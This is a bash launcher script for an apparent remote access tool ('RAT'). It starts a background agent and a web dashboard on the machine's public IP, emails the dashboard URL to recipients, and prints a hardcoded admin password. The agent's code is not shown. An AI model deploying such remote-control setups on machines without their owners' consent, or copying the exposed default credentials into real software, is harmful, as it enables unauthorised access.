#!/bin/bash

################################################################################
# RAT Application - Start with Public URL
################################################################################

set -e

# Colors
RED='\033[0;31m'
GREEN='\033[0;32m'
YELLOW='\033[1;33m'
BLUE='\033[0;34m'
NC='\033[0m'

print_info() { echo -e "${BLUE}[INFO]${NC} $1"; }
print_success() { echo -e "${GREEN}[SUCCESS]${NC} $1"; }
print_warning() { echo -e "${YELLOW}[WARNING]${NC} $1"; }

SCRIPT_DIR="$(cd "$(dirname "${BASH_SOURCE[0]}")" && pwd)"
cd "$SCRIPT_DIR"

echo "================================================================================"
echo "              RAT Application - Start with Public URL"
echo "================================================================================"
echo ""

# Get public IP
print_info "Getting public IP..."
PUBLIC_IP=$(curl -s ifconfig.me 2>/dev/null || curl -s ipinfo.io/ip 2>/dev/null || echo "localhost")
DASHBOARD_URL="http://${PUBLIC_IP}:5000"

# Kill any existing processes
print_info "Stopping existing RAT processes..."
pkill -f "python3.*rat_agent/agent.py" 2>/dev/null || true
pkill -f "python3.*dashboard/app.py" 2>/dev/null || true
sleep 2

# Start the RAT agent in background
print_info "Starting RAT agent..."
nohup python3 rat_agent/agent.py > /tmp/opencode/rat_agent.log 2>&1 &
AGENT_PID=$!
print_success "Agent started (PID: $AGENT_PID)"

# Start the dashboard in background
print_info "Starting dashboard..."
cd dashboard
nohup python3 app.py > /tmp/opencode/rat_dashboard.log 2>&1 &
DASHBOARD_PID=$!
print_success "Dashboard started (PID: $DASHBOARD_PID)"
cd ..

# Wait for dashboard to start
print_info "Waiting for dashboard to start..."
sleep 5

# Check if dashboard is running
if curl -s http://127.0.0.1:5000/login > /dev/null; then
    print_success "Dashboard is running"
else
    print_warning "Dashboard may not have started properly"
    echo "Check logs: cat /tmp/opencode/rat_dashboard.log"
fi

# Send URL to recipients
print_info "Sending public URL to recipients..."
python3 -c "
import sys
sys.path.insert(0, '$SCRIPT_DIR')
from rat_agent.emailer import EmailSender
from rat_agent.config import Config
emailer = EmailSender(Config())
emailer.send_dashboard_url('$DASHBOARD_URL')
"

echo ""
echo "================================================================================"
echo "                        RAT is Running!"
echo "================================================================================"
echo ""
echo "Public Dashboard URL: $DASHBOARD_URL"
echo "Local Dashboard URL:  http://localhost:5000"
echo ""
echo "Login Credentials:"
echo "  Username: admin"
echo "  Password: rat_admin_2024"
echo ""
echo "Process IDs:"
echo "  Agent PID:     $AGENT_PID"
echo "  Dashboard PID: $DASHBOARD_PID"
echo ""
echo "Commands:"
echo "  View agent logs:    tail -f /tmp/opencode/rat_agent.log"
echo "  View dashboard logs: tail -f /tmp/opencode/rat_dashboard.log"
echo "  Stop all:           pkill -f rat"
echo ""
echo "For a permanent public URL (works from any network):"
echo "  - Use ngrok:   https://ngrok.com (free signup)"
echo "  - Use cloudflared: https://www.cloudflare.com/products/tunnel/"
echo ""
echo "================================================================================"
